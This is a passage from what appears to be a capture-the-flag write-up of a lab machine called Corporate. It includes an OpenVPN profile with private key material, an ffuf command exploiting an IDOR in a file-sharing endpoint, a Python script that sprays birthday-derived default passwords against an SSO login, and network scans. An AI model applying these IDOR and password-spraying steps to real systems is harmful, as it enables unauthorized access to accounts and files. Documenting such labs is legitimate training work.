WTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAASKolvQAcvJ293lpZxpLnbbYYqsgcT0
1zYTzZkk12CRYaMbJ6W+1ZBZXJ2f48+aDm8S7C3r4u/sDXc+FUrBNDwpo4GYMIGV
MAwGA1UdEwQFMAMBAf8wHQYDVR0OBBYEFGU+AVBM2aKRbHfQ+DoLfmoiePiTMFkG
A1UdIwRSMFCAFGU+AVBM2aKRbHfQ+DoLfmoiePiToSKkIDAeMRwwGgYDVQQDDBNj
bl94OEpGa0VKdEFMYThEZXNDghRgZPlXi2vJx3wTQ+uSM0jRlClIqTALBgNVHQ8E
BAMCAQYwCgYIKoZIzj0EAwIDSAAwRQIgbyM0P/TIlipRosMFHk9JrPyV75VVjlt8
MVfJlpq3IkcCIQDrZcvRxSRMmHSijhiHf7U5yIKKGj8/GUeEhus8BeGnEQ==
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIB5jCCAYygAwIBAgIRAISd6CD9rjy91ijsreJEtBAwCgYIKoZIzj0EAwIwHjEc
MBoGA1UEAwwTY25feDhKRmtFSnRBTGE4RGVzQzAeFw0yMzA0MDgxNTQ0MjJaFw0y
NTA3MTExNTQ0MjJaMB4xHDAaBgNVBAMME21hcmdhcmV0dGUtYmF1bWJhY2gwWTAT
BgcqhkjOPQIBBggqhkjOPQMBBwNCAAR/kPVZnbFzHI8uA1a+Wrh5H7mmL02IQsOT
RQdvr2lt9KtHc7ZWf4r50Hf43jZjHqF5YzuqqDXwq/VlbSKiSfGDo4GqMIGnMAkG
A1UdEwQCMAAwHQYDVR0OBBYEFNWUOeFOYNCyFFr2WYfN3EDo9sSFMFkGA1UdIwRS
MFCAFGU+AVBM2aKRbHfQ+DoLfmoiePiToSKkIDAeMRwwGgYDVQQDDBNjbl94OEpG
a0VKdEFMYThEZXNDghRgZPlXi2vJx3wTQ+uSM0jRlClIqTATBgNVHSUEDDAKBggr
BgEFBQcDAjALBgNVHQ8EBAMCB4AwCgYIKoZIzj0EAwIDSAAwRQIhAMdDw56gsOxr
vePoNgWLU3dIbeHU9Nq9gsdVc28eMXTTAiBlvTPw2PrZ67U0zUz+7uRB/ni/bWx0
f7wZ+hFRNTJM+Q==
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgGw23pM3sBiY/OaIu
5Km69gzPUzmSPXk20bvMAMOmJd2hRANCAAR/kPVZnbFzHI8uA1a+Wrh5H7mmL02I
QsOTRQdvr2lt9KtHc7ZWf4r50Hf43jZjHqF5YzuqqDXwq/VlbSKiSfGD
-----END PRIVATE KEY-----
</key>
<tls-crypt>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
2bb0b14ce194a37f9b6a7dee08252428
ad270eb5689c6b91d0792085ddafe951
892a1a5064cd3797d68089103d61d901
143d0b9b4bc7466ce4e4a365fa7fb2fb
95cdecf8b3b9b4f49278fd2addd72966
30e2bc7fb804d37470c131176f0a95b7
c5d9504e226fb332027ecf9d2df925ea
a0b96a42bd83b0aad7af7a7e1c77efaa
0e8abbbfc67f0702059c169e16cb55f1
a565842f91217cf8b49157b4527138ec
83e334110175a5fc0c0b7dd4e112131b
1603901871e42e6d7b469321a61c3896
1844f982c3712c5d131fd2a04a0602f6
836c94ec16c4016f11792f8030d4fd44
142095231382a5bd798c9207483f4c14
3031e83a7a64726dddcbd480e35a37cd
-----END OpenVPN Static key V1-----
</tls-crypt>
oxdf@hacky$ head margarette-baumbach.ovpn
client
proto udp
explicit-exit-notify
remote corporate.htb 1194
dev tun
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server

```

The VPN server defined on line 4 is `corporate.htb` on port 1194, which is UDP based on line 2. I can connect to this and identify hosts, but it isn’t of much use yet.

I’ll also note that the links to the files are like `/sharing/file/229`, where 229 is the ID of the file.

The browse button doesn’t work for me to upload files.

The share icon does pop a form to give an email address to share with:

![image-20240709151127684](/img/image-20240709151127684.png)

If I try to share with the email of the user I’m currently logged in as, it fails:

![image-20240709151715850](/img/image-20240709151715850.png)

I’ll give another email found on a user’s profile, and it shows success:

![image-20240709151644893](/img/image-20240709151644893.png)

It’s also worth noting that emails must be all lowercase. Sharing with `Candido.Hackett@corporate.htb` returns user not found, but `candido.hackett@corporate.htb` works.

#### Calendar

The calendar page (`/calendar`) just shows a static page of this month’s calendar along with a single weekly meeting:

![image-20240709145059687](/img/image-20240709145059687.png)

#### Holidays

The holidays / leave page (`/holidays`) has a form to request days off:

![image-20240709145201244](/img/image-20240709145201244.png)

On submitting, it shows up at the bottom as denied:

![image-20240709145227021](/img/image-20240709145227021.png)

#### Payroll

The payroll site (`/payroll`) has a drop down to select a year and request documents:

![image-20240709145309233](/img/image-20240709145309233.png)

Regardless of what year I select, it says it can’t find data:

![image-20240709145328326](/img/image-20240709145328326.png)

### IDOR

#### Read Fail

I’ll return to the Share page. Given that files are accessed by their id, it’s worth checking if I can access other files. I’ll send the request for the file to Burp Repeater. Noting that Margarette shows files 229-233 on their page, I’ll try getting file 223:

![image-20240709151317578](/img/image-20240709151317578.png)

It returns 403 Forbidden.

#### Share Success

The request to share a file is a POST request:

```

POST /sharing HTTP/1.1
Host: people.corporate.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Cookie: CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NSwibmFtZSI6Ik1hcmdhcmV0dGUiLCJzdXJuYW1lIjoiQmF1bWJhY2giLCJlbWFpbCI6Ik1hcmdhcmV0dGUuQmF1bWJhY2hAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMDU0ODIwNywiZXhwIjoxNzIwNjM0NjA3fQ.0GnWEY70useTfDbXuFT0HsshbnAf4DaJEJ-20utrkyw; session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; session.sig=XK2801ywOUJT4r87cnfTVjyi9uM

fileId=229&email=candido.hackett%40corporate.htb

```

It takes an ID and an email to share with. I’ll test to see if I can share a file I can’t access back to the current user. The POST requests redirects to `/sharing` regardless of result, with the message in the `session` cookie:

[![image-20240709152525372](/img/image-20240709152525372.png)*Click for full size image*](/img/image-20240709152525372.png)

It says the current user can’t share with themself, but no issue with that user not owning the file. I got a cookie earlier for `candido.hackett@corporate.htb`. I’ll log in in a different browser as them and look at their files:

![image-20240709152830343](/img/image-20240709152830343.png)

The ids are 218-221.

Now I’ll try to share 223 with them:

![image-20240709152626085](/img/image-20240709152626085.png)

It seems to have worked! And on Candido’s page:

![image-20240709152923949](/img/image-20240709152923949.png)

#### Brute Force Add

I’ll use what I know so far with `ffuf` to try to share every document with Candido Hacket with the following arguments:
- `-u http://people.corporate.htb/sharing` - The URL to POST to.
- `-d 'fileId=FUZZ&email=candido.hackett%40corporate.htb'` - The data to post, including the fuzzed `fileId`.
- `-w <( seq 1 1000)` - The values to fuzz. This takes a file, so I’ll use the `<()` operator to capture the output of the `seq` command in a virtual file and pass that to `ffuf`.
- `-b 'CorporateSSO=eyJhbGciOi...[snip]...bnAf4DaJEJ-20utrkyw'` - The cookie to auth as Margarette Baumbach.
- `-H 'Content-Type: application/x-www-form-urlencoded'` - `Content-Type` header so that the site will accept the data.
- `-ac` - Automatically filter the response to limit the output as it’s not useful.

This takes a couple seconds to run:

```

oxdf@hacky$ ffuf -u http://people.corporate.htb/sharing -d 'fileId=FUZZ&email=candido.hackett%40corporate.htb' -w <( seq 1 1000) -b 'CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NSwibmFtZSI6Ik1hcmdhcmV0dGUiLCJzdXJuYW1lIjoiQmF1bWJhY2giLCJlbWFpbCI6Ik1hcmdhcmV0dGUuQmF1bWJhY2hAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMDU0ODIwNywiZXhwIjoxNzIwNjM0NjA3fQ.0GnWEY70useTfDbXuFT0HsshbnAf4DaJEJ-20utrkyw' -H 'Content-Type: application/x-www-form-urlencoded' -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://people.corporate.htb/sharing
 :: Wordlist         : FUZZ: /dev/fd/63
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NSwibmFtZSI6Ik1hcmdhcmV0dGUiLCJzdXJuYW1lIjoiQmF1bWJhY2giLCJlbWFpbCI6Ik1hcmdhcmV0dGUuQmF1bWJhY2hAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMDU0ODIwNywiZXhwIjoxNzIwNjM0NjA3fQ.0GnWEY70useTfDbXuFT0HsshbnAf4DaJEJ-20utrkyw
 :: Data             : fileId=FUZZ&email=candido.hackett%40corporate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

:: Progress: [1000/1000] :: Job [1/1] :: 348 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

Then there are *many* more files on Candido’s page:

![image-20240709163240349](/img/image-20240709163240349.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The largest id is 240, so it’s safe to say 1000 seems like enough of a check. These are reset frequently, so it’s useful to have the `ffuf` command ready to run again.

#### Intel

Scanning through the various documents, most of it is not interesting. All but one of the files are `.docx` files. There is one PDF:

![image-20240709163420436](/img/image-20240709163420436.png)

The PDF is 8 pages, most of which is fluff. On page 7, there’s an “Onboarding” section:

![image-20240709163707221](/img/image-20240709163707221.png)

### Find Users with Default Passwords

#### Brute Force

Each user profile has their email as well as their birthday. From looking at links in the employee chat, it seems that each user has an id in the 5000-5100 range. I’ll make sure the script has a valid cookie so it can access the people page. Then it will:
- Loop over IDs, going from 5000-5100 (at least on a first pass, can always come back and run more if necessary).
- For each ID, get `/employee/<id>` and recover the username and birthday.
- Try to login as that username and the default password generated from the birthday.

My script ends up as:

```

#!/usr/bin/env python3

import re
import requests

cookie = {"CorporateSSO": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MiwibmFtZSI6IkNhbmRpZG8iLCJzdXJuYW1lIjoiSGFja2V0dCIsImVtYWlsIjoiQ2FuZGlkby5IYWNrZXR0QGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjA1NDk1ODcsImV4cCI6MTcyMDYzNTk4N30.HkhMdZieL8hHm1ob2VqDHsAVxMHEFyEvNJcBEEujxLc"}

for i in range(5000, 5100):
    resp = requests.get(f"http://people.corporate.htb/employee/{i}", cookies=cookie)

    if "Sorry, we couldn't find that employee!" in resp.text:
        print(f"\r[{i}]" + " " * 60, end="")
        continue

    user_name = re.findall(r"(\w+\.\w+)@corporate.htb", resp.text)[0]
    birthday_str = re.findall(r'<th scope="row">Birthday</th>\s+<td>(\d{1,2}/\d{1,2}/\d{4})</td>', resp.text)[0]
    m, d, y = birthday_str.split('/')
    password = f"CorporateStarter{d.zfill(2)}{m.zfill(2)}{y}"

    print(f"\r[{i}] {user_name}: {password}" + " "*30, end="")

    resp_login = requests.post(
        'http://sso.corporate.htb/login', 
        data={'username': user_name, 'password': password},
        allow_redirects=False)
    if "/login?error=Invalid%20username%20or%20password" not in resp_login.text:
        print()

print("\r" + " " * 60 + "\r", end="")

```

I’ve written it so that it shows the current attempt on the last line but only successful one stay:

![](/img/corporate-brute_default_users.gif)

That’s four users still using their initial default password.

#### Evaluate Results

With these creds, I can log in via the SSO to get access. From any one profile, I can view them all and check them out:

![image-20240709204047691](/img/image-20240709204047691.png)

elwin.jones is in IT, which is interesting. The other three users are consultants.

### VPN

#### Connection

I’ll download the VPN configuration from elwin.jones’ shared files (though any user would work), and connect with OpenVPN:

```

oxdf@hacky$ sudo openvpn elwin-jones.ovpn 
2024-07-09 20:44:34 OpenVPN 2.5.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Sep 29 2023
2024-07-09 20:44:34 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10
2024-07-09 20:44:34 Outgoing Control Channel Encryption: Cipher 'AES-256-CTR' initialized with 256 bit key
2024-07-09 20:44:34 Outgoing Control Channel Encryption: Using 256 bit message hash 'SHA256' for HMAC authentication
2024-07-09 20:44:34 Incoming Control Channel Encryption: Cipher 'AES-256-CTR' initialized with 256 bit key
2024-07-09 20:44:34 Incoming Control Channel Encryption: Using 256 bit message hash 'SHA256' for HMAC authentication
2024-07-09 20:44:34 TCP/UDP: Preserving recently used remote address: [AF_INET]10.10.11.246:1194
2024-07-09 20:44:34 Socket Buffers: R=[212992->212992] S=[212992->212992]
2024-07-09 20:44:34 UDP link local: (not bound)
2024-07-09 20:44:34 UDP link remote: [AF_INET]10.10.11.246:1194
2024-07-09 20:44:34 TLS: Initial packet from [AF_INET]10.10.11.246:1194, sid=c5984075 38f1996b
2024-07-09 20:44:35 VERIFY OK: depth=1, CN=cn_x8JFkEJtALa8DesC
2024-07-09 20:44:35 VERIFY KU OK
2024-07-09 20:44:35 Validating certificate extended key usage
2024-07-09 20:44:35 ++ Certificate has EKU (str) TLS Web Server Authentication, expects TLS Web Server Authentication
2024-07-09 20:44:35 VERIFY EKU OK
2024-07-09 20:44:35 VERIFY X509NAME OK: CN=server_xIsQbY7vcIxWACne
2024-07-09 20:44:35 VERIFY OK: depth=0, CN=server_xIsQbY7vcIxWACne
2024-07-09 20:44:35 Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 256 bit EC, curve prime256v1, signature: ecdsa-with-SHA256
2024-07-09 20:44:35 [server_xIsQbY7vcIxWACne] Peer Connection Initiated with [AF_INET]10.10.11.246:1194
2024-07-09 20:44:35 PUSH: Received control message: 'PUSH_REPLY,route-nopull,route 10.9.0.0 255.255.255.0,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-128-GCM'
2024-07-09 20:44:35 Options error: option 'route-nopull' cannot be used in this context ([PUSH-OPTIONS])
2024-07-09 20:44:35 OPTIONS IMPORT: timers and/or timeouts modified
2024-07-09 20:44:35 OPTIONS IMPORT: --ifconfig/up options modified
2024-07-09 20:44:35 OPTIONS IMPORT: route options modified
2024-07-09 20:44:35 OPTIONS IMPORT: route-related options modified
2024-07-09 20:44:35 OPTIONS IMPORT: peer-id set
2024-07-09 20:44:35 OPTIONS IMPORT: adjusting link_mtu to 1624
2024-07-09 20:44:35 OPTIONS IMPORT: data channel crypto options modified
2024-07-09 20:44:35 Outgoing Data Channel: Cipher 'AES-128-GCM' initialized with 128 bit key
2024-07-09 20:44:35 Incoming Data Channel: Cipher 'AES-128-GCM' initialized with 128 bit key
2024-07-09 20:44:35 net_route_v4_best_gw query: dst 0.0.0.0
2024-07-09 20:44:35 net_route_v4_best_gw result: via 10.0.2.2 dev enp0s3
2024-07-09 20:44:35 ROUTE_GATEWAY 10.0.2.2/255.255.255.0 IFACE=enp0s3 HWADDR=08:00:27:e5:80:bb
2024-07-09 20:44:35 TUN/TAP device tun1 opened
2024-07-09 20:44:35 net_iface_mtu_set: mtu 1500 for tun1
2024-07-09 20:44:35 net_iface_up: set tun1 up
2024-07-09 20:44:35 net_addr_v4_add: 10.8.0.2/24 dev tun1
2024-07-09 20:44:35 net_route_v4_add: 10.9.0.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1
2024-07-09 20:44:35 Initialization Sequence Completed

```

I’ll note at the bottom that it creates a `tun1` device (`tun0` is already in use by my HTB VPN), with the IP 10.8.0.2/24, and add a route for 10.9.0.0/24 via 10.8.0.1. That suggests that 10.8.0.1 is the VPN device, and it has a 10.9.0.0/24 network behind it.

#### Host Enumeration

A quick way to check for hosts on a network is with `ping`:

```

oxdf@hacky$ time for i in {1..254}; do (ping -c 1 10.9.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 10.9.0.1: icmp_seq=1 ttl=64 time=153 ms
64 bytes from 10.9.0.4: icmp_seq=1 ttl=63 time=151 ms

real    0m0.166s
user    0m0.115s
sys     0m0.056s

```

Instantly two hosts are identified. `nmap` is pretty quick as well:

```

oxdf@hacky$ nmap --min-rate 10000 10.9.0.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 20:47 EDT
Nmap scan report for 10.9.0.1
Host is up (0.089s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
636/tcp  open  ldapssl
2049/tcp open  nfs
3128/tcp open  squid-http

Nmap scan report for 10.9.0.4
Host is up (0.089s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind

Nmap done: 256 IP addresses (2 hosts up) scanned in 1.41 seconds

```

#### 10.9.0.1 nmap

I’ll run my standard `nmap` to get all open ports and then run safe scripts and version checks:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.9.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 20:53 EDT
Nmap scan report for 10.9.0.1
Host is up (0.086s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
636/tcp  open  ldapssl
2049/tcp open  nfs
3004/tcp open  csoftragent
3128/tcp open  squid-http
8006/tcp open  wpl-analytics

Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
oxdf@hacky$ nmap -p 22,80,389,636,2049,3004,3128,8006 -sCV 10.9.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 20:53 EDT
Nmap scan report for 10.9.0.1
Host is up (0.086s latency).

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp   open  http           OpenResty web app server 1.21.4.3
|_http-server-header: openresty/1.21.4.3
|_http-title: Did not follow redirect to http://corporate.htb
389/tcp  open  ldap           OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Not valid before: 2023-04-04T14:37:34
|_Not valid after:  2033-04-01T14:37:35
|_ssl-date: TLS randomness does not represent time
636/tcp  open  ssl/ldap       OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Not valid before: 2023-04-04T14:37:34
|_Not valid after:  2033-04-01T14:37:35
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs            4 (RPC #100003)
3004/tcp open  csoftragent?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 303 See Other
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Location: /explore
|     Set-Cookie: i_like_gitea=c463fa4b25345167; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=zbDWLfKaPam_oxFwtK58N83b6pE6MTcyMDU3MjgxMjYwODA5Njc5MA; Path=/; Expires=Thu, 11 Jul 2024 00:53:32 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 10 Jul 2024 00:53:32 GMT
|     Content-Length: 35
|     href="/explore">See Other</a>.
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=07dc3e54b21cdac8; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=CHxFpEAX27PLPGrcp9RrB1f7Px46MTcyMDU3MjgxMjc5ODc4MDA1NA; Path=/; Expires=Thu, 11 Jul 2024 00:53:32 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 10 Jul 2024 00:53:32 GMT
|_    Content-Length: 0
3128/tcp open  http           Proxmox Virtual Environment REST API 3.0
|_http-server-header: pve-api-daemon/3.0
|_http-title: Site doesn't have a title.
8006/tcp open  wpl-analytics?
| fingerprint-strings:
|   HTTPOptions:
|     HTTP/1.0 501 method 'OPTIONS' not available
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Wed, 10 Jul 2024 00:53:41 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Wed, 10 Jul 2024 00:53:41 GMT
|   Help, TerminalServerCookie:
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Wed, 10 Jul 2024 00:53:57 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Wed, 10 Jul 2024 00:53:57 GMT
|   Kerberos:
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Wed, 10 Jul 2024 00:53:58 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Wed, 10 Jul 2024 00:53:58 GMT
|   LDAPSearchReq, LPDString:
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Wed, 10 Jul 2024 00:54:08 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Wed, 10 Jul 2024 00:54:08 GMT
|   RTSPRequest:
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Wed, 10 Jul 2024 00:53:41 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|_    Expires: Wed, 10 Jul 2024 00:53:41 GMT
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3004-TCP:V=7.80%I=7%D=7/9%Time=668DDBA3%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,234,"HTTP/1\.0\x20303\x20See\x20Other\r\nCache-
SF:Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/explor
SF:e\r\nSet-Cookie:\x20i_like_gitea=c463fa4b25345167;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=zbDWLfKaPam_oxFwtK58N83b6pE
SF:6MTcyMDU3MjgxMjYwODA5Njc5MA;\x20Path=/;\x20Expires=Thu,\x2011\x20Jul\x2
SF:02024\x2000:53:32\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x
SF:20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite=Lax
SF:\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2010\x20Jul\x20202
SF:4\x2000:53:32\x20GMT\r\nContent-Length:\x2035\r\n\r\n<a\x20href=\"/expl
SF:ore\">See\x20Other</a>\.\n\n")%r(HTTPOptions,1DD,"HTTP/1\.0\x20405\x20M
SF:ethod\x20Not\x20Allowed\r\nCache-Control:\x20max-age=0,\x20private,\x20
SF:must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=07dc3e5
SF:4b21cdac8;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_c
SF:srf=CHxFpEAX27PLPGrcp9RrB1f7Px46MTcyMDU3MjgxMjc5ODc4MDA1NA;\x20Path=/;\
SF:x20Expires=Thu,\x2011\x20Jul\x202024\x2000:53:32\x20GMT;\x20HttpOnly;\x
SF:20SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=
SF:0;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDa
SF:te:\x20Wed,\x2010\x20Jul\x202024\x2000:53:32\x20GMT\r\nContent-Length:\
SF:x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServer
SF:Cookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8006-TCP:V=7.80%I=7%D=7/9%Time=668DDBAC%P=x86_64-pc-linux-gnu%r(HTT
SF:POptions,D7,"HTTP/1\.0\x20501\x20method\x20'OPTIONS'\x20not\x20availabl
SF:e\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\nDate:\x20We
SF:d,\x2010\x20Jul\x202024\x2000:53:41\x20GMT\r\nPragma:\x20no-cache\r\nSe
SF:rver:\x20pve-api-daemon/3\.0\r\nExpires:\x20Wed,\x2010\x20Jul\x202024\x
SF:2000:53:41\x20GMT\r\n\r\n")%r(RTSPRequest,C4,"HTTP/1\.0\x20400\x20bad\x
SF:20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\nDat
SF:e:\x20Wed,\x2010\x20Jul\x202024\x2000:53:41\x20GMT\r\nPragma:\x20no-cac
SF:he\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Wed,\x2010\x20Jul\x
SF:202024\x2000:53:41\x20GMT\r\n\r\n")%r(Help,C4,"HTTP/1\.0\x20400\x20bad\
SF:x20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\nDa
SF:te:\x20Wed,\x2010\x20Jul\x202024\x2000:53:57\x20GMT\r\nPragma:\x20no-ca
SF:che\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Wed,\x2010\x20Jul\
SF:x202024\x2000:53:57\x20GMT\r\n\r\n")%r(TerminalServerCookie,C4,"HTTP/1\
SF:.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\nConnectio
SF:n:\x20close\r\nDate:\x20Wed,\x2010\x20Jul\x202024\x2000:53:57\x20GMT\r\
SF:nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20W
SF:ed,\x2010\x20Jul\x202024\x2000:53:57\x20GMT\r\n\r\n")%r(Kerberos,C4,"HT
SF:TP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\nConn
SF:ection:\x20close\r\nDate:\x20Wed,\x2010\x20Jul\x202024\x2000:53:58\x20G
SF:MT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:
SF:\x20Wed,\x2010\x20Jul\x202024\x2000:53:58\x20GMT\r\n\r\n")%r(LPDString,
SF:C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r
SF:\nConnection:\x20close\r\nDate:\x20Wed,\x2010\x20Jul\x202024\x2000:54:0
SF:8\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nEx
SF:pires:\x20Wed,\x2010\x20Jul\x202024\x2000:54:08\x20GMT\r\n\r\n")%r(LDAP
SF:SearchReq,C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20m
SF:ax-age=0\r\nConnection:\x20close\r\nDate:\x20Wed,\x2010\x20Jul\x202024\
